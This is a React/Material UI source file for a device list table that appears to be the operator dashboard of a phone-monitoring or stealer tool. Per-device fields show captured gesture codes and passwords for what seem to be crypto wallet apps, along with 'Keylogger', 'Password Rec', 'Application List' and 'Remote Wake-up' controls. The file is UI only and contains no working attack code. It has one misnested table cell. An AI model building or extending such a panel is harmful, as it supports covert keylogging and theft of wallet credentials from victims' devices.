import React from "react";
import {
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Paper,
  Box,
  Button,
  Typography,
  IconButton,
} from "@mui/material";
import { styled } from "@mui/material/styles";
import PaginationControls from "./PaginationControls.js";
import EditIcon from '@mui/icons-material/Edit';
import InfoIcon from '@mui/icons-material/Info';
import { useTranslation } from 'react-i18next';

const headerBgColor = "#f5f5f5";
const rowBgColorEven = "#ffffff";
const rowBgColorOdd = "#f9f9f9";
const borderColor = "#e0e0e0";

const StyledTableCell = styled(TableCell)(({ theme }) => ({
  borderBottom: `1px solid ${borderColor}`,
  borderRight: `1px solid ${borderColor}`,
  whiteSpace: "nowrap",
  padding: "6px 8px",
  color: "#666",
  fontSize: "13px",
}));

const StyledTableHeadCell = styled(StyledTableCell)(({
  backgroundColor: headerBgColor,
  fontWeight: "bold",
  borderBottom: `1px solid ${borderColor}`,
  borderRight: `1px solid ${borderColor}`,
}));

const CustomActionButton = styled(Button)(({ theme, color }) => ({
  backgroundColor: color === 'primary' ? "#1976d2" : color === 'secondary' ? "#ff5722" : "#ffffff",
  color: color === 'primary' || color === 'secondary' ? "white" : "#666",
  fontSize: "11px",
  margin: "0 2px",
  padding: "1px 6px",
  textTransform: "none",
  minWidth: "unset",
  "&:hover": {
    backgroundColor: color === 'primary' ? "#1565c0" : color === 'secondary' ? "#e64a19" : "#e0e0e0",
  },
}));

const GreyButtons = styled(Button)(({ theme }) => ({
  backgroundColor: "white",  
  color: "#333",               
  fontSize: "10px",            
  border: `1px solid ${borderColor}`,  
  margin: "1px 2px",
  padding: "2px 5px",          
  textTransform: "none",
  minWidth: "unset",
  "&:hover": {
    backgroundColor: "#e0e0e0",  
    borderColor: "#b0b0b0",      
  },
}));

const StyledTableRow = styled(TableRow)(({ index }) => ({
  backgroundColor: index % 2 === 0 ? rowBgColorEven : rowBgColorOdd,
}));

const IconBox = styled(Box)(({ theme }) => ({
  border: `1px solid ${borderColor}`, 
  borderRadius: "4px",  
  display: "inline-flex",
  alignItems: "center",
  justifyContent: "center",
  width: "30px", 
  height: "30px", 
}));

const DeviveListTable = ({ rows, page, rowsPerPage, setPage, totalItems, handleChangeRowsPerPage }) => {
  const { t } = useTranslation();

  return (
    <Paper
      sx={{
        padding: "16px",
        backgroundColor: "#ffffff",
        boxShadow: "0px 4px 10px rgba(0, 0, 0, 0.1)",
      }}
    >
      <Typography
        variant="h6"
        sx={{
          marginBottom: "16px",
          color: "#666",
          borderBottom: `1px solid ${borderColor}`,
          paddingBottom: "8px",
        }}
      >
        {t('Equipment List')}
      </Typography>

      <Box sx={{ border: `1px solid ${borderColor}`, borderRadius: '4px' }}>
        <TableContainer>
          <Table stickyHeader sx={{ minWidth: 650, borderCollapse: "separate" }} size="small" aria-label="user table">
            <TableHead>
              <TableRow>
                <StyledTableHeadCell>{t('Serial')}</StyledTableHeadCell>
                <StyledTableHeadCell>{t('Application Information')}</StyledTableHeadCell>
                <StyledTableHeadCell>{t('Password Information')}</StyledTableHeadCell>
                <StyledTableHeadCell>{t('Related')}</StyledTableHeadCell>
                <StyledTableHeadCell>{t('Device Information')}</StyledTableHeadCell>
                <StyledTableHeadCell>{t('User Information')}</StyledTableHeadCell>
                <StyledTableHeadCell>{t('Set Status')}</StyledTableHeadCell>
                <StyledTableHeadCell>{t('Self-start')}</StyledTableHeadCell>
                <StyledTableHeadCell>{t('Open Times')}</StyledTableHeadCell>
                <StyledTableHeadCell
                  sx={{
                    position: "sticky",
                    right: 0,
                    backgroundColor: headerBgColor,
                    zIndex: 2,
                    boxShadow: "-4px 0px 10px rgba(0, 0, 0, 0.1)",
                  }}
                >
                  {t('Operate')}
                </StyledTableHeadCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {rows.map((row, index) => (
                <StyledTableRow key={row.id} index={index}>
                  <StyledTableCell>
                    {row.id}<br/>
                    <IconBox>
                      <IconButton size="small">
                        <EditIcon fontSize="small" />
                      </IconButton>
                    </IconBox>
                  </StyledTableCell>
                  <StyledTableCell>
                    {t('Device ID')}: {row.deviceId}<br/>
                    {t('Version/Region')}: {row.versionRegion}<br/>
                    {t('Creation Time')}: {row.creationTime}<br/>
                    {t('Last Update')}: {row.lastUpdate}
                  </StyledTableCell>
                  <StyledTableCell>
  {t('Digital Gesture')}:<br/>
  {t('TP Bitpe')}:<br/>
  {t('IMKU Coin')}:<br/>
  {t('Boba Fox')}:
</StyledTableCell>

                  <StyledTableCell>
                    {row.plusFour} <IconButton size="small"><InfoIcon fontSize="small" /></IconButton><br/>
                    <GreyButtons variant="outlined" size="small">{t('Password Rec')}</GreyButtons><br/>
  <GreyButtons variant="outlined" size="small">{t('Keylogger')}</GreyButtons><br/>
  <GreyButtons variant="outlined" size="small">{t('Application List')}</GreyButtons><br/>
                  </StyledTableCell>
                  <StyledTableCell>
  {t('Brand')}: {row.brand}<br/>
  {t('Model')}: {row.model}<br/>
  {t('Version/Parameter')}:<br/>
  <Box sx={{ display: 'flex', alignItems: 'center' }}>
    <IconBox>
      <IconButton size="small">
        <EditIcon fontSize="small" />
      </IconButton>
    </IconBox>
    <Typography sx={{ marginLeft: '8px' }}>{t('Label')}:</Typography>
  </Box>
</StyledTableCell>

                  <StyledTableCell>
                  <StyledTableCell>
  {t('User ID')}<br/>
  {t('Account/Proxy')}: / 
  <Typography component="span" sx={{ color: 'red', fontWeight: 'bold' }}>
    {t('Unassigned')}
  </Typography><br/>
  {t('Nickname')}: <br/>
  {t('Login')}:
</StyledTableCell>

                  </StyledTableCell>
                  <StyledTableCell>
                    {t('Battery Policy')}:<br/>
                    <Typography component="span" sx={{ color: 'green', fontWeight: 'bold' }}> {t(row.set)}</Typography>
                    <GreyButtons variant="outlined" size="small">{t('All permissions')}</GreyButtons><br/>
                    {t('Smart Assistant')}:<br/>
                    <Typography component="span" sx={{ color: 'green', fontWeight: 'bold' }}>{t('All permissions')}</Typography>
                  </StyledTableCell>
                  <StyledTableCell>
                    {t('Settings/Startup Method')}:<br/>
                    <Typography component="span" sx={{ color: 'green', fontWeight: 'bold' }}>
                      {t('No settings required.') }
                    </Typography>{" "}
                    {t('Manually open.')}<br/>
                    {t('Last Startup')}:<br/>
                    2024-09-14 17:56:19
                  </StyledTableCell>
                  <StyledTableCell>
                    {t('Total/Manual/Auto Start')}:<br/>
                    1 {t('times')}/1 {t('times')}/0 {t('times')}<br/>
                    {t('Last Shutdown')}:<br/>
                    
                  </StyledTableCell>
                  <StyledTableCell
                    sx={{
                      position: "sticky",
                      right: 0,
                      background: "white",
                      zIndex: 1,
                      boxShadow: "-4px 0px 10px rgba(0, 0, 0, 0.1)",
                    }}
                  >
                    <Box sx={{ display: "flex", flexDirection: "column", gap: 0.5 , paddingRight: "95px" }}>
                      <CustomActionButton size="small" color="primary">{t('Remote Wake-up')}</CustomActionButton>
                      <CustomActionButton size="small" color="secondary">{t('View Rules')}</CustomActionButton>
                      <GreyButtons size="small">{t('Add New Rules')}</GreyButtons>
                      <GreyButtons size="small">{t('Batch Import')}</GreyButtons>
                    </Box>
                  </StyledTableCell>
                </StyledTableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <PaginationControls
          page={page}
          rowsPerPage={rowsPerPage}
          setPage={setPage}
          totalItems={totalItems}
          handleChangeRowsPerPage={handleChangeRowsPerPage}
        />
      </Box>
    </Paper>
  );
};

export default DeviveListTable;
